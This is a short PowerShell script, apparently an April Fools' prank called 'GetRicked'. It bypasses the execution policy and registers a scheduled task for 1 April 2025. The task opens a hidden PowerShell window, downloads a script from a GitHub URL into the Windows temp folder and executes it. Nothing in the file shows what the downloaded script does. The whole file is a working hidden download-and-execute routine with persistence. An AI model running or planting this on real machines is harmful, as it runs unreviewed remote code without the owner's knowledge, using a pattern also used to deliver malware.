Set-ExecutionPolicy -Scope CurrentUser Bypass
$runTime = Get-Date "2025-04-01 10:30"
$taskName = "GetRicked"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/GetRicked.ps1' -outfile 'C:\Windows\Temp\getricked.ps1'; & 'C:\Windows\Temp\getricked.ps1'"
$trigger = New-ScheduledTaskTrigger -Once -At $runTime
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Get rickity rickity ricked son!"
